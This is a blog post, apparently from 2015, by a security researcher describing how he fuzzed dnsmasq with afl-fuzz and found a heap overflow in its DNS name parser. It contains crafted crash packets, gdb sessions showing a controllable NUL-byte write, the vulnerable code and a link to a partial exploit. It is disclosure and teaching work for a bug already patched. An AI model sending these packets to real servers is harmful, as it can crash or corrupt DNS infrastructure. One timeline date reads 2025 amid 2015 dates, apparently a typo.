---
id: 2161
title: 'How I saved the Internet with afl-fuzz (well, not really)'
date: '2015-07-10T13:18:11-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'https://blog.skullsecurity.org/2015/2009-revision-v1'
permalink: '/?p=2161'
---

If you know me, you know that [I love DNS](https://github.com/iagox86/dnscat2). I'm not exactly sure how that happened, but I suspect that [Ed Skoudis](https://twitter.com/edskoudis) is at least partly to blame.

Anyway, a project came up to evaluate dnsmasq, and being a DNS server - and a key piece of Internet infrastructure - I thought it would be fun! And it was! By fuzzing in a somewhat creative way, I found a really cool vulnerability that's almost certainly exploitable (though I haven't proven that for reasons that'll become apparent later).

Although I started writing an exploit, I didn't finish it. I think it's almost certainly exploitable, so if you have some free time and you want to learn about exploit development, it's worthwhile having a look! [Here's a link](https://downloads.skullsecurity.org/DANGEROUS/dnsmasq-2.73rc7.tar.gz) to the actual distribution of a vulnerable version, and I'll discuss the work I've done so far at the end of this post.

You can also download [my branch](https://github.com/iagox86/dnsmasq-fuzzing), which is similar to the vulnerable version (branched from it), the only difference is that it contains a bunch of fuzzing instrumentation and debug output around parsing names.

<style>.in { color: #dc322f; font-weight: bold; }</style>## dnsmasq

For those of you who don't know, [dnsmasq](http://www.thekelleys.org.uk/dnsmasq/doc.html) is a service that you can run that handles a number of different protocols designed to configure your network: DNS, DHCP, DHCP6, TFTP, and more. We'll focus on DNS - I fuzzed the other interfaces and didn't find anything, though when it comes to fuzzing, absence of evidence isn't the same as evidence of absence.

It's primarily developed by a single author, Simon Kelley. It's had a reasonably clean history in terms of vulnerabilities, which may be a good thing (it's coded well) or a bad thing (nobody's looking) :)

At any rate, the author's response was impressive. I made a little timeline:

- May 12, 2015: Discovered
- May 14, 2015: Reported to project
- May 14, 2025: Project responded with a patch candidate
- May 15, 2015: Patch committed

The fix was actually pushed out faster than I reported it! (I didn't report for a couple days because I was trying to determine how exploitable / scary it actually is - it turns out that yes, it's exploitable, but no, it's not scary - we'll get to why at the end).

## DNS - the important bits

The vulnerability is in the DNS name-parsing code, so it makes sense to spend a little time making sure you're familiar with DNS. If you're already familiar with how DNS packets and names are encoded, you can skip this section.

Note that I'm only going to cover the parts of DNS that matter, which means I'm going to leave out a bunch of stuff. Check out the RFCs (rfc1035, among others) or Wikipedia for complete details. Although you *should* learn enough to manually make requests to DNS servers, because that's an important skill to have :)

DNS, at its core, is actually rather simple. A client wants to look up a hostname, so it sends a DNS packet containing a question to a DNS server (on UDP port 53). Some magic happens, involving caches and recursion, then the server replies with a DNS message containing the original question, and zero or more answers.

### DNS packet structure

The structure of a DNS packet is:

- (int16) transaction id (trn\_id)
- (int16) flags (which include QR \[query/response\], opcode, RD \[recursion desired\], RA \[recursion available\], and probably other stuff that I'm forgetting)
- (int16) question count (qdcount)
- (int16) answer count (ancount)
- (int16) authority count (nscount)
- (int16) additional count (arcount)
- (variable) questions
- (variable) answers
- (variable) authorities
- (variable) additionals

The last four fields - questions, answers, authorities, and additionals - are collectively called "resource records". Resource records of different types have different properties, but we aren't going to worry about that. The general structure of a question record is:

- (variable) name (the important part!)
- (int16) type (A/AAAA/CNAME/etc.)
- (int16) class (basically always 0x0001, for Internet addresses)

### DNS names

Questions and answers typically contain a domain name. A domain name, as we typically see it, looks like:

```
this.is.a.name.skullseclabs.org
```

But in a resource records, there aren't actually any periods, instead, each field is preceded by its length, with a null terminator (or a zero-length field) at the end:

```
\x04this\x02is\x01a\x04name\x0cskullseclabs\x03org\x00
```

The maximum length of a field is 63 - 0x3f - bytes. If a field starts with 0x40, 0x80, 0xc0, and possibly others, it has a special meaning (we'll get to that shortly).

### Questions and answers

When you send a question to a DNS server, the packet looks something like:

- (header)
- question count = 1
- question 1: ANY record for skullsecurity.org?

and the response looks like:

- (header)
- question count = 1
- answer count = 11
- question 1: ANY record for "skullsecurity.org"?
- answer 1: "skullsecurity.org" has a TXT record of "oh hai NSA"
- answer 2: "skullsecurity.org" has a MX record for "ASPMX.L.GOOGLE.com".
- answer 3: "skullsecurity.org" has a A record for "206.220.196.59"
- ...

(yes, those are some of my real records :) )

If you do the math, you'll see that "skullsecurity.org" takes up 18 bytes, and would be included in the packet 12 times, counting the question, which means we're effectively wasting 18 \* 11 or close to 200 bytes. In the old days, 200 bytes were a lot. Heck, in the new days, 200 bytes are still a lot when you're dealing with millions of requests.

### Record pointers

Remember how I said that name fields starting with numbers above 63 - 0x3f - are special? Well, the one we're going to pay attention to is 0xc0.

0xc0 effectively means, "the next byte is a pointer, starting from the first byte of the packet, to where you can find the rest of the name".

So typically, you'll see:

- 12-bytes header (trn\_id + flags + counts)
- question 1: ANY record for "skullsecurity.org"
- answer 1: \\xc0\\x0c has a TXT record of "oh hai NSA"
- answer 2: \\xc0\\x0c ...

"\\xc0" indicates a pointer is coming, and "\\x0c" says "look 0x0c (12) bytes from the start of the packet", which is immediately after the header. You can also use it as part of a domain name, so your answer could be "\\x03www\\xc0\\x0c", which would become "www.skullsecurity.org" (assuming that string was 12 bytes from the start).

This is only mildly relevant, but a common problem that DNS parsers (both clients and servers) have to deal with is the infinite loop attack. Basically, the following packet structure:

- 12-byte header
- question 1: ANY record for "\\xc0\\x0c"

Because question 1 is self-referential, it reads itself over and over and the name never finishes parsing. dnsmasq solves this by limiting reference to 256 hops - that decision prevents a denial-of-service attack, but it's also what makes this vulnerability likely exploitable. :)

## Setting up the fuzz

All right, by now we're DNS experts, right? Good, because we're going to be building a DNS packet by hand right away!

Before we get to the actual vulnerability, I want to talk about how I set up the fuzzing. Being a networked application, it makes sense to use a network fuzzer; however, I really wanted to try out [afl-fuzz](http://lcamtuf.coredump.cx/afl/) from [lcamtuf](https://twitter.com/lcamtuf), which is a file-format fuzzer.

afl-fuzz works as an intelligent file-format fuzzer that will instrument the executable (either by specially compiling it or using binary analysis) to determine whether or not it's hitting "new" code on each execution. It optimizes each cycle to take advantage of all the new code paths it's found. It's really quite cool!

Unfortunately, DNS doesn't use files, it uses packets. So I decided to modify dnsmasq to read a packet from a file, parse it, then exit. That made it possible to fuzz with afl-fuzz.

Unfortunately, that was actually pretty non-trivial. The parsing code and networking code were all mixed together. I ended up re-implementing "recv\_msg()" and "recv\_from()", among other things, and replacing their calls to those functions. That could also be done with a LD\_PRELOAD hook, but because I had source that wasn't necessary. If you want to see the changes I made to make it possible to fuzz, you can [search the codebase for "#ifdef FUZZ"](https://github.com/iagox86/dnsmasq-fuzzing/search?q=%22ifdef+FUZZ%22&type=Code) - I made the fuzzing stuff entirely optional.

If you want to follow along, you should be able to reproduce the crash with the following commands (I'm on 64-bit Linux, but I don't see why it wouldn't work elsewhere):

```

$ <span class="in">git clone <a href="https://github.com/iagox86/dnsmasq-fuzzing">https://github.com/iagox86/dnsmasq-fuzzing</a></span>
Cloning into <span class="Statement">'</span><span class="Constant">dnsmasq-fuzzing</span><span class="Statement">'</span>...
<span class="Comment">[...]</span>
$ <span class="in"><span class="Statement">cd</span> dnsmasq-fuzzing/</span>
$ <span class="in"><span class="Identifier">CFLAGS</span>=-DFUZZ make <span class="Special">-j10</span></span>
<span class="Comment">[...]</span>
$ <span class="in">./src/dnsmasq <span class="Special">-d</span> <span class="Special">--randomize-port</span> <span class="Special">--client-fuzz</span> fuzzing/crashes/client-heap-overflow-1.bin</span>
dnsmasq: started, version  cachesize <span class="Constant">150</span>
dnsmasq: compile <span class="Statement">time</span> options: IPv6 GNU-getopt no-DBus no-i18n no-IDN DHCP DHCPv6 no-Lua TFTP no-conntrack ipset auth DNSSEC loop-detect inotify
dnsmasq: reading /etc/resolv.conf
<span class="Comment">[...]</span>
Segmentation fault
```

Warning: DNS is recursive, and in my fuzzing modifications I didn't disable the recursive requests. That means that dnsmasq *will* forward some of your traffic to upstream DNS servers, and that traffic *could* impact those severs (and I actually proved that, by accident; but we won't get into that :) ).

## Doing the actual fuzzing

Once you've set up the program to be fuzzable, fuzzing it is actually really easy.

First, you need a DNS request and response - that way, we can fuzz both sides (though ultimately, we don't need to, since both the request and response parse names). If you've wasted your life like I have, you can just write the request by hand and send it to a server:

```
<pre id="vimCodeElement">
$ <span class="in"><span class="Statement">mkdir</span> <span class="Special">-p</span> fuzzing/client/input/</span>
$ <span class="in"><span class="Statement">mkdir</span> <span class="Special">-p</span> fuzzing/client/output/</span>
$ <span class="in"><span class="Statement">echo</span><span class="Constant"> -ne </span><span class="Statement">"</span><span class="Special">\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01</span><span class="Statement">"</span><span class="Constant"> </span><span class="Statement">></span> fuzzing/client/input/request.bin</span>
$ <span class="in"><span class="Statement">mkdir</span> <span class="Special">-p</span> fuzzing/server/input/</span>
$ <span class="in"><span class="Statement">mkdir</span> <span class="Special">-p</span> fuzzing/server/output/</span>
$ <span class="in"><span class="Statement">cat</span> request.bin | nc <span class="Special">-vv</span> <span class="Special">-u</span> 8.8.8.8 <span class="Constant">53</span> <span class="Statement">></span> fuzzing/server/input/response.bin</span>
```

To break down the packet, in case you're curious

- "\\x12\\x34" - trn\_id - just a random number
- "\\x01\\x00" - flags - I think that flag is RD - recursion desired
- "\\x00\\x01" - qdcount = 1
- "\\x00\\x00" - ancount = 0
- "\\x00\\x00" - nscount = 0
- "\\x00\\x00" - arcount = 0
- "\\x06google\\x03com\\x00" - name = "google.com"
- "\\x00\\x01" - type = A record
- "\\x00\\x01" - class = IN (Internet)

You can verify it's working by hexdump'ing the response:

```

$ <span class="in">hexdump -C response.bin</span>
00000000  12 34 81 80 00 01 00 0b  00 00 00 00 06 67 6f 6f  |.4...........goo|
00000010  67 6c 65 03 63 6f 6d 00  00 01 00 01 c0 0c 00 01  |gle.com.........|
00000020  00 01 00 00 01 2b 00 04  ad c2 21 67 c0 0c 00 01  |.....+....!g....|
00000030  00 01 00 00 01 2b 00 04  ad c2 21 66 c0 0c 00 01  |.....+....!f....|
00000040  00 01 00 00 01 2b 00 04  ad c2 21 69 c0 0c 00 01  |.....+....!i....|
00000050  00 01 00 00 01 2b 00 04  ad c2 21 68 c0 0c 00 01  |.....+....!h....|
00000060  00 01 00 00 01 2b 00 04  ad c2 21 63 c0 0c 00 01  |.....+....!c....|
00000070  00 01 00 00 01 2b 00 04  ad c2 21 61 c0 0c 00 01  |.....+....!a....|
00000080  00 01 00 00 01 2b 00 04  ad c2 21 6e c0 0c 00 01  |.....+....!n....|
00000090  00 01 00 00 01 2b 00 04  ad c2 21 64 c0 0c 00 01  |.....+....!d....|
000000a0  00 01 00 00 01 2b 00 04  ad c2 21 60 c0 0c 00 01  |.....+....!`....|
000000b0  00 01 00 00 01 2b 00 04  ad c2 21 65 c0 0c 00 01  |.....+....!e....|
000000c0  00 01 00 00 01 2b 00 04  ad c2 21 62              |.....+....!b|
```

Notice how it starts with "\\x12\\x34" (the same transaction id I sent), has a question count of 1, has an answer count of 0x0b (11), and contains "\\x06google\\x03com\\x00" 12 bytes in (that's the question). That's basically what we discussed earlier. But the important part is, it has "\\xc0\\x0c" throughout. In fact, every answer starts with "\\xc0\\x0c", because every answer is to the first and only question.

That's exactly what I was talking about earlier - each of those 11 instances of "\\xc0\\x0c" saved about 10 bytes, so the packet is 110 bytes shorter than it would otherwise have been.

Now that we have a base case for both the client and the server, we can compile the binary with afl-fuzz's instrumentation (obviously, this assumes that afl-fuzz is stored in "~/tools/afl-1.77b" - change as necessary):

```

$ <span class="in">CC=~/tools/afl-1.77b/afl-gcc CFLAGS=-DFUZZ make -j20</span>
```

and run the fuzzer:

```

$ <span class="in">~/tools/afl-1.77b/afl-fuzz -i fuzzing/client/input/ -o fuzzing/client/output/ ./dnsmasq --client-fuzz=@@</span>
```

you can simultaneously fuzz the server, too, in a different window:

```

$ <span class="in">~/tools/afl-1.77b/afl-fuzz -i fuzzing/server/input/ -o fuzzing/server/output/ ./dnsmasq --server-fuzz=@@</span>
```

then let them run a few hours, or possibly overnight.

For fun, I ran a third instance:

```
<pre id="vimCodeElement">
$ <span class="in"><span class="Statement">mkdir</span> <span class="Special">-p</span> fuzzing/hello/input</span>
$ <span class="in"><span class="Statement">echo</span><span class="Constant"> </span><span class="Statement">"</span><span class="Constant">hello</span><span class="Statement">"</span><span class="Constant"> </span><span class="Statement">></span> fuzzing/hello/input/hello.bin</span>
$ <span class="in"><span class="Statement">mkdir</span> <span class="Special">-p</span> fuzzing/hello/output</span>
$ <span class="in"><span class="Statement">~/tools/afl-1.77b/afl-fuzz</span> <span class="Special">-i</span> fuzzing/fun/input/ <span class="Special">-o</span> fuzzing/fun/output/ ./dnsmasq <span class="Special">--server-fuzz=@@</span></span>
```

...which actually found an order of magnitude more crashes than the proper packets, except with much, much uglier proofs of concept.. :)

## Fuzz results

I let this run overnight, specifically to re-create the crashes for this blog. In the morning (after roughly 20 hours of fuzzing), the results were:

- 7 crashes starting with a well formed request
- 10 crashes starting from a well formed response
- 93 crashes starting from "hello"

You can download the base cases and results [here](https://blogdata.skullsecurity.org/fuzz_dnsmasq.tar.bz2), if you want.

### Triage

Although we have over a hundred crashes, I know from experience that they're all caused by the same core problem. But not knowing that, I need to pick something to triage! The difference between starting from a well formed request and starting from a "hello" string is noticeable... to take the smallest PoC from "hello", we have:

```

crashes $ <span class="in">hexdump -C id\:000024\,sig\:11\,src\:000234+000399\,op\:splice\,rep\:16</span>
00000000  68 00 00 00 00 01 00 02  e8 1f ec 13 07 06 e9 01  |h...............|
00000010  67 02 e8 1f c0 c0 c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |g...............|
00000020  c0 c0 c0 c0 c0 c0 c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |................|
00000030  c0 c0 c0 c0 c0 c0 c0 c0  c0 c0 b8 c0 c0 c0 c0 c0  |................|
00000040  c0 c0 c0 c0 c0 c0 c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |................|
00000050  c0 c0 c0 c0 c0 c0 c0 c0  c0 af c0 c0 c0 c0 c0 c0  |................|
00000060  c0 c0 c0 c0 cc 1c 03 10  c0 01 00 00 02 67 02 e8  |.............g..|
00000070  1f eb ed 07 06 e9 01 67  02 e8 1f 2e 2e 10 2e 2e  |.......g........|
00000080  00 07 2e 2e 2e 2e 00 07  01 02 07 02 02 02 07 06  |................|
00000090  00 00 00 00 7e bd 02 e8  1f ec 07 07 01 02 07 02  |....~...........|
000000a0  02 02 07 06 00 00 00 00  02 64 02 e8 1f ec 07 07  |.........d......|
000000b0  06 ff 07 9c 06 49 2e 2e  2e 2e 00 07 01 02 07 02  |.....I..........|
000000c0  02 02 05 05 e7 02 02 02  e8 03 02 02 02 02 80 c0  |................|
000000d0  c0 c0 c0 c0 c0 c0 c0 c0  c0 80 1c 03 10 80 e6 c0  |................|
000000e0  c0 c0 c0 c0 c0 c0 c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |................|
000000f0  c0 c0 c0 c0 c0 c0 b8 c0  c0 c0 c0 c0 c0 c0 c0 c0  |................|
00000100  c0 c0 c0 c0 c0 c0 c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |................|
00000110  c0 c0 c0 c0 c0 af c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |................|
00000120  cc 1c 03 10 c0 01 00 00  02 67 02 e8 1f eb ed 07  |.........g......|
00000130  00 95 02 02 02 05 e7 02  02 10 02 02 02 02 02 00  |................|
00000140  00 80 03 02 02 02 f0 7f  c7 00 80 1c 03 10 80 e6  |................|
00000150  00 95 02 02 02 05 e7 67  02 02 02 02 02 02 02 00  |.......g........|
00000160  00 80                                             |..|
```

Or, if we run afl-tmin on it to minimize:

```

00000000  30 30 00 30 00 01 30 30  30 30 30 30 30 30 30 30  |00.0..0000000000|
00000010  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
00000020  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
00000030  30 30 30 30 30 30 30 30  30 30 30 30 30 c0 c0 30  |0000000000000..0|
00000040  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
00000050  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
00000060  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
00000070  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
00000080  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
00000090  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
000000a0  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
000000b0  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
000000c0  05 30 30 30 30 30 c0 c0
```

(note the 0xc0 at the end - our old friend - but instead of figuring out "\\xc0\\x0c", the simplest case, it found a much more complex case)

Whereas here are all four crashing messages from the valid request starting point:

```

crashes $ <span class="in">hexdump -C id\:000000\,sig\:11\,src\:000034\,op\:flip2\,pos\:24</span>
00000000  12 34 01 00 00 01 00 00  00 00 00 00 06 67 6f 6f  |.4...........goo|
00000010  67 6c 65 03 63 6f 6d c0  0c 01 00 01              |gle.com.....|
0000001c
```

```

crashes $ <span class="in">hexdump -C id\:000001\,sig\:11\,src\:000034\,op\:havoc\,rep\:4</span>
00000000  12 34 08 00 00 01 00 00  e1 00 00 00 06 67 6f 6f  |.4...........goo|
00000010  67 6c 65 03 63 6f 6d c0  0c 01 00 01              |gle.com.....|
0000001c
```

```

crashes $ <span class="in">hexdump -C id\:000002\,sig\:11\,src\:000034\,op\:havoc\,rep\:2</span>
00000000  12 34 01 00 eb 00 00 00  00 00 00 00 06 67 6f 6f  |.4...........goo|
00000010  67 6c 65 03 63 6f 6d c0  0c 01 00 01              |gle.com.....|
```

```

crashes $ <span class="in">hexdump -C id\:000003\,sig\:11\,src\:000034\,op\:havoc\,rep\:4</span>
00000000  12 34 01 00 00 01 01 00  00 00 10 00 06 67 6f 6f  |.4...........goo|
00000010  67 6c 65 03 63 6f 6d c0  0c 00 00 00 00 00 06 67  |gle.com........g|
00000020  6f 6f 67 6c 65 03 63 6f  6d c0 00 01 00 01        |oogle.com.....|
0000002e
```

At the end of the day, we could make this work for any of those crashes, but simpler is better, so that's what we'll do.

The first three crashes are interesting, because they're very similar. The only differences are the flags field (0x0100 or 0x0800) and the count fields (the first is unmodified, the second has 0xe100 "authority" records listed, and the third has 0xeb00 "question" records). Presumably, that stuff doesn't matter, since random-looking values work.

Also note that near the end of every message, we see our old friend again: "\\xc0\\x0c".

We can run afl-tmin on the first one to get the tightest message we can:

```

00000000  30 30 30 30 30 30 30 30  30 30 30 30 06 30 6f 30  |000000000000.0o0|
00000010  30 30 30 03 30 30 30 c0  0c                       |000.000..|
```

As predicted, the question and answer counts don't matter. All that matters is the name's length fields and the "\\xc0\\x0c". Oddly it included the "o" from google.com, which is probably a bug (my fuzzing instrumentation isn't perfect because due to requests going to the Internet, the result isn't always deterministic).

## The vulnerability

Now that we have a decent PoC, let's check it out in a debugger:

```

$ <span class="in">gdb -q --args ./dnsmasq -d --randomize-port --client-fuzz=./min.bin</span>
Reading symbols from ./dnsmasq...done.
Unable to determine compiler version.
Skipping loading of libstdc++ pretty-printers for now.
(gdb) run
[...]
Program received signal SIGSEGV, Segmentation fault.
__strcpy_sse2 () at ../sysdeps/x86_64/multiarch/../strcpy.S:135
135     ../sysdeps/x86_64/multiarch/../strcpy.S: No such file or directory.
```

It crashed in strcpy. Fun! Let's see the line it crashed on:

```
<pre id="vimCodeElement">
(gdb) <span class="in">x/i <span class="Identifier">$rip</span></span>
=> <span class="Constant">0x7ffff73cc600</span> <__strcpy_sse2+<span class="Constant">192</span>>:  mov    BYTE PTR [rdx],al
(gdb) <span class="in"><span class="Constant">print</span>/x <span class="Identifier">$rdx</span></span>
$1 = <span class="Constant">0x0</span>
```

Oh, a null-pointer write. Seems pretty lame.

Honestly, when I got here, I lost steam. Null-pointer dereferences need to be fixed, especially because they can hide other bugs, but they aren't going to earn me l33t status. So I would have to fix it or deal with hundreds of crappy results.

If we look at the packet in more detail, the name it's parsing is essentially: "\\x06AAAAAA\\x03AAA\\xc0\\x0c" (changed '0' to 'A' to make it easier on the eyes). The "\\xc0\\x0c" construct reference 12 bytes into the message, which is the start of the name. When it's parsed, after one round, it'll be "\\x06AAAAAA\\x03AAA\\x06AAAAAA\\x03AAA\\xc0\\x0c". But then it reaches the "\\xc0\\x0c" again, and goes back to the beginning. Basically, it infinite loops in the name parser.

So, it's obvious that a self-referential name causes the problem. But why?

I tracked down the code that handles 0xc0. It's in rfc1035.c, and looks like:

```
<pre id="vimCodeElement">
     <span class="Statement">if</span> (label_type == <span class="Constant">0xc0</span>) <span class="Comment">/*</span><span class="Comment"> pointer </span><span class="Comment">*/</span>
        {
          <span class="Statement">if</span> (!CHECK_LEN(header, p, plen, <span class="Constant">1</span>))
            <span class="Statement">return</span> <span class="Constant">0</span>;

          <span class="Comment">/*</span><span class="Comment"> get offset </span><span class="Comment">*/</span>
          l = (l&<span class="Constant">0x3f</span>) << <span class="Constant">8</span>;
          l |= *p++;

          <span class="Statement">if</span> (!p1) <span class="Comment">/*</span><span class="Comment"> first jump, save location to go back to </span><span class="Comment">*/</span>
            p1 = p;

          hops++; <span class="Comment">/*</span><span class="Comment"> break malicious infinite loops </span><span class="Comment">*/</span>
          <span class="Statement">if</span> (hops > <span class="Constant">255</span>)
          {
            printf(<span class="Constant">"Too many hops!</span><span class="Special">\n</span><span class="Constant">"</span>);
            printf(<span class="Constant">"Returning: [</span><span class="Special">%d</span><span class="Constant">] </span><span class="Special">%s</span><span class="Special">\n</span><span class="Constant">"</span>, ((<span class="Type">uint64_t</span>)cp) - ((<span class="Type">uint64_t</span>)name), name);
            <span class="Statement">return</span> <span class="Constant">0</span>;
          }

          p = l + (<span class="Type">unsigned</span> <span class="Type">char</span> *)header;
        }
```

If look at that code, everything looks pretty okay (and for what it's worth, the printf()s are my instrumentation and aren't in the original). If that's not the problem, the only other field type being parsed is the name part (ie, the part without 0x40/0xc0/etc. in front). Here's the code (with a bunch of stuff removed and the indents re-flowed):

```
<pre id="vimCodeElement">
  namelen += l;
  <span class="Statement">if</span> (namelen+<span class="Constant">1</span> >= MAXDNAME)
  {
    printf(<span class="Constant">"namelen is too long!</span><span class="Special">\n</span><span class="Constant">"</span>); <span class="Comment">/*</span><span class="Comment"> <-- This is what triggers. </span><span class="Comment">*/</span>
    printf(<span class="Constant">"Returning: [</span><span class="Special">%d</span><span class="Constant">] </span><span class="Special">%s</span><span class="Special">\n</span><span class="Constant">"</span>, ((<span class="Type">uint64_t</span>)cp) - ((<span class="Type">uint64_t</span>)name), name);
    <span class="Statement">return</span> <span class="Constant">0</span>;
  }
  <span class="Statement">if</span> (!CHECK_LEN(header, p, plen, l))
  {
    printf(<span class="Constant">"CHECK_LEN failed!</span><span class="Special">\n</span><span class="Constant">"</span>);
    <span class="Statement">return</span> <span class="Constant">0</span>;
  }
  <span class="Statement">for</span>(j=<span class="Constant">0</span>; j<l; j++, p++)
  {
    <span class="Type">unsigned</span> <span class="Type">char</span> c = *p;
    <span class="Statement">if</span> (c != <span class="Constant">0</span> && c != <span class="Constant">'.'</span>)
      *cp++ = c;
    <span class="Statement">else</span>
      <span class="Statement">return</span> <span class="Constant">0</span>;
  }
  *cp++ = <span class="Constant">'.'</span>;
```

This code runs for each segment that starts with a value less than 64 ("google" and "com", for example).

At the start, <tt>l</tt> is the length of the segment (so 6 in the case of "google"). It adds that to the current TOTAL length - <tt>namelen</tt> - then checks if it's too long - this is the check that prevents a buffer overflow.

Then it reads in <tt>l</tt> bytes, one at a time, and copies them into a buffer - <tt>cp</tt> - which happens to be on the heap. the <tt>namelen</tt> check prevents that from overflowing.

*Then it copies a period into the buffer and doesn't increment namelen*.

Do you see the problem there? It adds <tt>l</tt> to the total length of the buffer, then it reads in <tt>l + 1</tt> bytes, counting the period. Oops?

It turns out, you can mess around with the length and size of substrings quite a bit to get a lot of control over what's written rare, but exploiting it is as simple as doing a lookup for "\\x08AAAAAAAA\\xc0\\x0c":

```
<pre id="vimCodeElement">
$ <span class="Statement">echo</span><span class="Constant"> -ne </span><span class="Statement">'</span><span class="Constant">\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08AAAAAAAA\xc0\x0c\x00\x00\x01\x00\x01</span><span class="Statement">'</span><span class="Constant"> </span><span class="Statement">></span> crash.bin
$ ./dnsmasq <span class="Special">-d</span> <span class="Special">--randomize-port</span> <span class="Special">--client-fuzz=./crash.bin</span>
<span class="Comment">[</span>...<span class="Statement">]</span>
Segmentation fault
```

However, there are two termination conditions: it'll only loop a grand total of 255 times, and it stops after <tt>namelen</tt> reaches 1024 (non-period) bytes. So coming up with the best possible balance to overwrite what you want is actually pretty tricky - possibly even requires a bit of calculus (or, if you're an engineer, [a program that can optimize it for you](https://blogdata.skullsecurity.org/dnsmasq-partial-sploit.rb) :) ).

I should also mention: the reason the "\\xc0\\x0c" is needed in the first place is that it's impossible to have a name string in that's 1024 bytes - somewhere along the line, it runs afoul of a length check. The "\\xc0\\x0c" method lets us repeat stuff over and over, sort of like decompressing a small string into memory, overflowing the buffer.

## Exploitability

I mentioned earlier that it's a null-pointer deref:

```
<pre id="vimCodeElement">
(gdb) x/i <span class="Identifier">$rip</span>
=> <span class="Constant">0x7ffff73cc600</span> <__strcpy_sse2+<span class="Constant">192</span>>:  mov    BYTE PTR [rdx],al
(gdb) <span class="Constant">print</span>/x <span class="Identifier">$rdx</span>
$1 = <span class="Constant">0x0</span>
```

Let's try again with the crash.bin file we just created, using "\\x08AAAAAAAA\\xc0\\x0c" as the payload:

```
<pre id="vimCodeElement">
$ echo -ne <span class="Constant">'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08AAAAAAAA\xc0\x0c\x00\x00\x01\x00\x01'</span> > crash.bin
$ gdb -q --args ./dnsmasq -d --randomize-port --client-fuzz=./crash.bin
[...]
(gdb) run
[...]
(gdb) x/i <span class="Identifier">$rip</span>
=> <span class="Constant">0x449998</span> <answer_request+<span class="Constant">1064</span>>:      mov    DWORD PTR [rdx+<span class="Constant">0x20</span>],<span class="Constant">0x0</span>
(gdb) <span class="Constant">print</span>/x <span class="Identifier">$rdx</span>
$1 = <span class="Constant">0x4141412e41414141</span>
```

Woah.. that's not a null-pointer dereference! That's a write-NUL-byte-to-arbitrary-memory! Those might be exploitable!

As I mentioned earlier, this is actually a heap overflow. The interesting part is, the heap memory is allocated once - immediately after the program starts - and right after, a heap for the global settings object (<tt>daemon</tt>) is allocated. That means that we have effectively full control of this object, at least the first couple hundred bytes:

```
<pre id="vimCodeElement">
<span class="Type">extern</span> <span class="Type">struct</span> daemon {
  <span class="Comment">/*</span><span class="Comment"> datastuctures representing the command-line and.</span>
<span class="Comment">     config file arguments. All set (including defaults)</span>
<span class="Comment">     in option.c </span><span class="Comment">*/</span>

  <span class="Type">unsigned</span> <span class="Type">int</span> options, options2;
  <span class="Type">struct</span> resolvc default_resolv, *resolv_files;
  <span class="Type">time_t</span> last_resolv;
  <span class="Type">char</span> *servers_file;
  <span class="Type">struct</span> mx_srv_record *mxnames;
  <span class="Type">struct</span> naptr *naptr;
  <span class="Type">struct</span> txt_record *txt, *rr;
  <span class="Type">struct</span> ptr_record *ptr;
  <span class="Type">struct</span> host_record *host_records, *host_records_tail;
  <span class="Type">struct</span> cname *cnames;
  <span class="Type">struct</span> auth_zone *auth_zones;
  <span class="Type">struct</span> interface_name *int_names;
  <span class="Type">char</span> *mxtarget;
  <span class="Type">int</span> addr4_netmask;
  <span class="Type">int</span> addr6_netmask;
  <span class="Type">char</span> *lease_file;.
  <span class="Type">char</span> *username, *groupname, *scriptuser;
  <span class="Type">char</span> *luascript;
  <span class="Type">char</span> *authserver, *hostmaster;
  <span class="Type">struct</span> iname *authinterface;
  <span class="Type">struct</span> name_list *secondary_forward_server;
  <span class="Type">int</span> group_set, osport;
  <span class="Type">char</span> *domain_suffix;
  <span class="Type">struct</span> cond_domain *cond_domain, *synth_domains;
  <span class="Type">char</span> *runfile;.
  <span class="Type">char</span> *lease_change_command;
  <span class="Type">struct</span> iname *if_names, *if_addrs, *if_except, *dhcp_except, *auth_peers, *tftp_interfaces;
  <span class="Type">struct</span> bogus_addr *bogus_addr, *ignore_addr;
  <span class="Type">struct</span> server *servers;
  <span class="Type">struct</span> ipsets *ipsets;
  <span class="Type">int</span> log_fac; <span class="Comment">/*</span><span class="Comment"> log facility </span><span class="Comment">*/</span>
  <span class="Type">char</span> *log_file; <span class="Comment">/*</span><span class="Comment"> optional log file </span><span class="Comment">*/</span>                                                                                                              <span class="Type">int</span> max_logs;  <span class="Comment">/*</span><span class="Comment"> queue limit </span><span class="Comment">*/</span>
  <span class="Type">int</span> cachesize, ftabsize;
  <span class="Type">int</span> port, query_port, min_port;
  <span class="Type">unsigned</span> <span class="Type">long</span> local_ttl, neg_ttl, max_ttl, min_cache_ttl, max_cache_ttl, auth_ttl;
  <span class="Type">struct</span> hostsfile *addn_hosts;
  <span class="Type">struct</span> dhcp_context *dhcp, *dhcp6;
  <span class="Type">struct</span> ra_interface *ra_interfaces;
  <span class="Type">struct</span> dhcp_config *dhcp_conf;
  <span class="Type">struct</span> dhcp_opt *dhcp_opts, *dhcp_match, *dhcp_opts6, *dhcp_match6;
  <span class="Type">struct</span> dhcp_vendor *dhcp_vendors;
  <span class="Type">struct</span> dhcp_mac *dhcp_macs;
  <span class="Type">struct</span> dhcp_boot *boot_config;
  <span class="Type">struct</span> pxe_service *pxe_services;
  <span class="Type">struct</span> tag_if *tag_if;.
  <span class="Type">struct</span> addr_list *override_relays;
